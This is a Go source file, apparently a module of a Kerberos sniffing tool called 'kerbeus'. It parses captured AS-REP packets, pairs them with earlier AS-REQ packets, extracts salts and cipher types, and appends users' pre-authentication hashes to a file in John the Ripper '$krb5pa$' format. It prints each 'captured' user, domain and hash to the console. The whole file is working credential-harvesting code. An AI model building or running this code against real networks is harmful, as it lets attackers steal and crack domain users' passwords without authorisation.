package asrep

import (
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"

	"kerbeus/src/models"
	"kerbeus/src/utils"
)

func Process(buffer []byte, filename string, seen map[string]bool,
	pendingReqs map[string]*models.PendingASREQ, srcIP, dstIP string) {
	var asRep messages.ASRep
	err := asRep.Unmarshal(buffer)
	if err != nil {
		log.Printf("\r\033[K⚠️  Error parsing AS-REP: %v", err)
		return
	}

	usuario := asRep.CName.PrincipalNameString()
	realm := asRep.CRealm

	if usuario == "" || realm == "" {
		return
	}

	salt := extractSalt(&asRep, usuario, realm)

	key := fmt.Sprintf("\r\033[KAS-REP:%s", usuario)
	if seen[key] {
		log.Printf("\r\033[K⏭️  AS-REP already seen: %s", usuario)
		return
	}

	hashKey := fmt.Sprintf("HASH:%s", usuario)
	if pendingReq, ok := pendingReqs[hashKey]; ok {
		saveHash(pendingReq, usuario, realm, salt, filename)

		delete(pendingReqs, hashKey)
		delete(seen, fmt.Sprintf("AS-REQ:%s", usuario))
		delete(seen, key)
	} else {
		log.Printf("\n\r\033[K⚠️  AS-REP from %s arrived BEFORE AS-REQ (discarded)", usuario)
	}
}

func extractSalt(asRep *messages.ASRep, usuario, realm string) string {
	for _, padata := range asRep.PAData {
		if padata.PADataType == 19 {
			var etypeInfo2 types.ETypeInfo2
			if err := etypeInfo2.Unmarshal(padata.PADataValue); err == nil {
				for _, entry := range etypeInfo2 {
					if entry.Salt != "" {
						return entry.Salt
					}
				}
			}
		}

		if padata.PADataType == 11 {
			var etypeInfo types.ETypeInfo
			if err := etypeInfo.Unmarshal(padata.PADataValue); err == nil {
				for _, entry := range etypeInfo {
					if saltBytes := string(entry.Salt); saltBytes != "" {
						return saltBytes
					}
				}
			}
		}
	}

	salt := strings.ToUpper(realm) + usuario
	log.Printf("\r\033[K⚠️  Salt not found in AS-REP, using default: '%s' (user: %s)", salt, usuario)
	return salt
}

func saveHash(pendingReq *models.PendingASREQ, usuario, realm, salt, filename string) {
	var etypeStr, encName string
	switch pendingReq.EType {
	case 17:
		etypeStr, encName = "17", "AES128-CTS-HMAC-SHA1-96"
	case 18:
		etypeStr, encName = "18", "AES256-CTS-HMAC-SHA1-96"
	case 23:
		etypeStr, encName = "23", "RC4-HMAC"
	default:
		etypeStr = fmt.Sprintf("%d", pendingReq.EType)
		encName = fmt.Sprintf("Unknown (%d)", pendingReq.EType)
	}

	hashjohnFormat := fmt.Sprintf("$krb5pa$%s$%s$%s$%s$%s",
		etypeStr, usuario, realm, salt, pendingReq.Salt)

	johnOutput := fmt.Sprintf("%s:%s", usuario, hashjohnFormat)

	if !utils.UserExistsInFile(filename, usuario) {
		fmt.Printf("\n\r\033[K✅ Kerberos hash captured (successful authentication)\n\r")
		fmt.Printf("\r\033[K🌐 IP: %s -> %s\n\r", pendingReq.SrcIP, pendingReq.DstIP)
		fmt.Printf("\r\033[K👤 User: %s\n\r", usuario)
		fmt.Printf("\r\033[K🏢 Domain: %s\n\r", realm)
		fmt.Printf("\r\033[K🔑 Cipher: %s\n\r", encName)
		fmt.Printf("\r\033[K🧂 Salt: %s\n\r", salt)
		fmt.Printf("\r\033[K🔐 Hash: %s\n\r", pendingReq.Salt)
		fmt.Printf("\r\033[K📋 Hashjohn: %s\n\r", johnOutput)
	}

	if utils.UserExistsInFile(filename, usuario) {
		parts := strings.SplitN(johnOutput, ":", 2)
		if len(parts) == 2 {
			hashParts := strings.Split(parts[1], "$")
			if len(hashParts) >= 7 {
				pureHash := hashParts[6]
				utils.UpdateHashForUser(filename, usuario, salt, pureHash)
			}
		}
	} else {
		f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Printf("\r\033[Kerror opening file: %v", err)
			return
		}
		defer f.Close()
		if strings.HasSuffix(usuario, "$") {
			//log.Printf("\r\033[K⏭️  Hash de equipo descartado: %s", usuario)
			return
		}
		fmt.Fprintf(f, "%s\n", johnOutput)
	}
}
